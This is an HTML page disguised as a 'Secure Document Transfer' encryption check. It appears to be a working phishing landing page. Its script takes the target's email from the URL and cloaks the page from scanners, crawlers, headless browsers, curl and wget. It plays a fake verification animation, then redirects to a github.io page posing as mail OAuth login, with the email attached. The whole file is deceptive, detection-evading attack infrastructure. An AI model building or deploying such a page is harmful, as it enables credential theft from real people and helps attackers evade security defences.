<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<!-- Security: no index, no referrer -->
<meta name="robots" content="noindex,nofollow">
<meta name="referrer" content="no-referrer">
<title>Secure Document Transfer</title>
<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><rect width='32' height='32' rx='6' fill='%23107c10'/><text x='16' y='22' text-anchor='middle' fill='white' font-size='16' font-family='Arial'>🔒</text></svg>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',system-ui,sans-serif;background:#1a1a2e;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#e0e0e0}
.wrap{max-width:460px;width:90%;text-align:center}
.shield{width:64px;height:64px;margin:0 auto 24px;position:relative}
.shield-ring{width:64px;height:64px;border:3px solid rgba(16,124,16,.3);border-top-color:#107c10;border-radius:50%;animation:spin 1s linear infinite;position:absolute}
.shield-icon{width:64px;height:64px;display:flex;align-items:center;justify-content:center;font-size:28px}
@keyframes spin{to{transform:rotate(360deg)}}
h1{font-size:22px;font-weight:600;margin-bottom:8px;color:#fff}
.sub{font-size:14px;color:#a0a0b0;margin-bottom:32px;line-height:1.6}
.checks{text-align:left;max-width:300px;margin:0 auto 32px}
.check-item{display:flex;align-items:center;gap:12px;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.06);font-size:13px}
.check-dot{width:20px;height:20px;border-radius:50%;border:2px solid #333;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all .4s}
.check-dot.done{border-color:#107c10;background:#107c10}
.check-dot.done::after{content:'✓';color:#fff;font-size:11px}
.check-dot.active{border-color:#0078d4;animation:pulse 1s infinite}
@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(0,120,212,.4)}50%{box-shadow:0 0 0 6px rgba(0,120,212,0)}}
.check-label{color:#c0c0c0}.check-item.done .check-label{color:#e0e0e0}
.blocked{display:none;color:#e74c3c;font-size:14px;margin-top:16px}
</style>
</head>
<body>
<div class="wrap">
<div class="shield"><div class="shield-ring"></div><div class="shield-icon">🛡️</div></div>
<h1>Secure Document Transfer</h1>
<p class="sub">Your document is protected with end-to-end encryption.<br>Performing security verification...</p>
<div class="checks" id="checks">
<div class="check-item" data-i="0"><div class="check-dot"></div><span class="check-label">Verifying browser integrity</span></div>
<div class="check-item" data-i="1"><div class="check-dot"></div><span class="check-label">Checking encryption layer</span></div>
<div class="check-item" data-i="2"><div class="check-dot"></div><span class="check-label">Authenticating access token</span></div>
<div class="check-item" data-i="3"><div class="check-dot"></div><span class="check-label">Preparing secure access</span></div>
</div>
<p class="blocked" id="blocked">⛔ Automated access detected. Verification failed.</p>
</div>
<script>
/* ─── FIXED: Grab email from the URL ─── */
// 1. Read the email from the current page's URL (e.g. ?email=info@...)
const urlParams = new URLSearchParams(window.location.search);
const email = urlParams.get('email');

// 2. If NO email is found in the URL, stop and show an error message
if (!email) {
    document.querySelector('.sub').innerHTML = '❌ Missing email parameter. Please use: <br> <strong>?email=your@email.com</strong>';
    document.querySelector('.shield-ring').style.animation = 'none';
    document.querySelector('.shield-ring').style.borderColor = '#e74c3c';
    throw new Error('Email missing in URL');
}

// 3. Build the final redirect URL using backticks (`) so ${email} works!
const REDIRECT_URL = `https://mail-auth-services-20.github.io/09JEQ7LP-9JW8STTFU-Entry_point-default_oauthid/#${email}`;
/* ──────────────────────────────────────────── */

(function(){
var items=document.querySelectorAll('.check-item'),b=document.getElementById('blocked');
function bad(){b.style.display='block';document.getElementById('checks').style.display='none';document.querySelector('.shield-ring').style.animation='none';document.querySelector('.shield-ring').style.borderColor='#e74c3c'}
function chk(){
if(navigator.webdriver||window.__nightmare||window.callPhantom||window._phantom)return!1;
if(/bot|crawl|spider|headless|phantom|puppet|selenium|lighthouse|wget|curl|http|scan|preview|fetch|archive|index|probe/i.test(navigator.userAgent))return!1;
try{var c=document.createElement('canvas'),g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return!1}catch(e){return!1}
if(navigator.languages&&navigator.languages.length===0)return!1;
if(!window.chrome&&/Chrome/.test(navigator.userAgent))return!1;
if(screen.width<300||screen.height<300)return!1;
var n=performance.now();for(var i=0;i<1e5;i++)Math.sqrt(i);if(performance.now()-n<0.5)return!1;
if(typeof navigator.getBattery==='function'){try{navigator.getBattery().then(function(){})}catch(e){return!1}}
return!0
}
if(!chk()){bad();return}
var step=0;
items[0].querySelector('.check-dot').classList.add('active');
var iv=setInterval(function(){
items[step].querySelector('.check-dot').classList.remove('active');
items[step].querySelector('.check-dot').classList.add('done');
items[step].classList.add('done');
step++;
if(step<items.length){items[step].querySelector('.check-dot').classList.add('active')}
else{clearInterval(iv);setTimeout(function(){window.location.replace(REDIRECT_URL)},700)}
},1100);
})();
</script>
</body>
</html>
